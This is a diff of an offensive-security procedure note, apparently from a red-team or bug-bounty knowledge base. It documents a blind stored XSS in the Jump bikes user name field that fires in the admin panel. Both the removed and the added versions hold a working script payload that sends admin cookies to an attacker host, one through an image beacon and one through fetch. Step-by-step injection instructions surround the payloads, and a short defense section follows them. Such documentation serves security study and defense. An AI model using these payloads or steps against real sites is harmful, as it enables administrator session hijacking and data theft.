@@ -1,5 +1,4 @@
 ---
-id: proc-uuid-1
 tags:
   - xss
   - stored-xss
@@ -7,7 +6,7 @@ tags:
 type: procedure
 tools: []
 tactics:
-  - '[[Initial Access]]'
+  - '[[Execution]]'
 commands: []
 verified: false
 platforms:
@@ -16,14 +15,15 @@ submitted: true
 created_at: '2023-10-01T00:00:00Z'
 techniques:
   - '[[JavaScript]]'
-updated_at: '2025-12-13T23:52:49.219Z'
+updated_at: '2025-12-14T17:30:26.774Z'
 skill_level: intermediate
 impact_level: high
 detection_risk: low
 sub_techniques: []
+id: b8b6e4ec-ba31-4cc2-a064-dbbda07162c6
 validated: true
 mitre_tactics:
-  - '[[Initial Access]]'
+  - '[[Execution]]'
 mitre_techniques:
   - '[[JavaScript]]'
 ---
@@ -31,67 +31,67 @@ mitre_techniques:
 
 ## Summary
 
-This procedure involves injecting a malicious JavaScript payload into the user name field of the Jump bikes platform, exploiting insufficient input sanitization to store it for later execution in the admin panel.
+This procedure exploits a lack of input sanitization in the user name field of the Jump bikes application to store a blind XSS payload that remains dormant until rendered in the admin panel.
 
 ## Description
 
-In the Jump bikes platform, the user name field allows profile modifications without proper escaping, enabling stored XSS. An attacker with a valid user account crafts a payload that, when rendered in the admin interface at manage.jumpbikes.com, executes JavaScript in the admin's browser context. This can lead to session hijacking and data exfiltration. The attack is blind, meaning no immediate feedback, but relies on admin interaction.
+In the Jump bikes web application, the user name field accepts arbitrary input without proper escaping or validation. An attacker with a valid user account can inject JavaScript code, which is stored server-side. This payload is later displayed unsanitized in the admin panel (manage.jumpbikes.com), executing in the administrator's browser context. The attack is blind because the attacker does not immediately see the execution but can confirm via out-of-band channels like a data beacon. Prerequisites include an authenticated user session; no special privileges are needed beyond profile editing access.
 
 ## Requirements
 
-1. Valid user account on Jump bikes platform
-2. Web browser for profile editing
-3. Attacker server endpoint for data exfiltration (e.g., HTTP listener)
+1. Authenticated access to the Jump bikes user account
+2. Web browser for form submission
+3. Optional: Attacker-controlled server for payload callback (e.g., to log execution)
 
 ## Defense
 
 Defensive measures and detection strategies:
 
-- Implement strict input sanitization and output encoding (e.g., HTML entity encoding) for user name fields
+- Implement strict input sanitization and output encoding (e.g., HTML entity encoding) for all user-controlled fields
 - Use Content Security Policy (CSP) to restrict script execution
-- Monitor admin panel access logs for anomalous JavaScript execution or external callbacks
+- Monitor admin panel access logs for anomalies and enable XSS payload scanning in user inputs
 
 ## Objectives
 
-1. Store malicious payload without detection
-2. Prepare for execution in privileged admin context
-3. Enable subsequent data theft
+1. Store malicious JavaScript in the user name field
+2. Ensure payload survives storage and retrieval
+3. Prepare for execution in elevated admin context
 
 ## Instructions
 
-### Step 1: Log In and Access Profile
+### Step 1: Authenticate and Navigate to Profile
 
-**Context**: Gain access to the user profile editing interface to modify the name field.
+**Context**: Gain access to the editable user name field.
 
-Log in to the Jump bikes platform using your account credentials. Navigate to account settings or profile page where the user name can be edited.
+Log in to the Jump bikes application using valid credentials. Navigate to the account settings or profile page where the user name can be edited.
 
 ### Step 2: Craft and Inject Payload
 
-**Context**: Insert the XSS payload into the user name field to store it server-side.
+**Context**: Insert the XSS payload into the user name field to test for storage without sanitization.
 
-Enter the following payload in the user name field:
+Enter a JavaScript payload in the user name field, such as:
 
 ```html
-<script>var i=new Image();i.src='http://attacker.com/log?cookie='+encodeURIComponent(document.cookie)+ '&page=' + encodeURIComponent(window.location.href);</script>
+<script>fetch('https://attacker-controlled-server.com/log?admin='+btoa(document.cookie));</script>
 ```
 
-This payload creates an image tag that sends admin cookies and page details to your server upon execution. Submit the form to save the profile.
+Submit the form to update the profile. This stores the payload server-side.
 
-> The payload is stored blindly; verify by checking if the profile updates without errors. No immediate alert or execution occurs.
+> The payload uses `fetch` to exfiltrate admin cookies upon execution. For testing, use a simple `<script>alert('XSS in Admin');</script>`.
 
 ### Step 3: Verify Storage
 
-**Context**: Confirm the payload is stored without triggering validation issues.
+**Context**: Confirm the payload is stored without triggering errors.
 
-After submission, reload the profile page to ensure the name appears modified (payload may be partially rendered or escaped in user view, but not in admin).
+After submission, refresh the profile page or log out/in to ensure the user name reflects the injected content (though it may not render the script visibly to the user).
 
-**Expected Output**: Profile saves successfully; payload persists in backend.
+**Expected Output**: Profile update success message; payload persists in the backend.
 
 ## MITRE ATT&CK Mapping
 
 ### Tactics
 
-- [[Initial Access]]
+- [[Execution]]
 
 ### Techniques
 
@@ -110,3 +110,4 @@ After submission, reload the profile page to ensure the name appears modified (p
 
 - [[xss]]
 - [[stored-xss]]
+- [[web]]
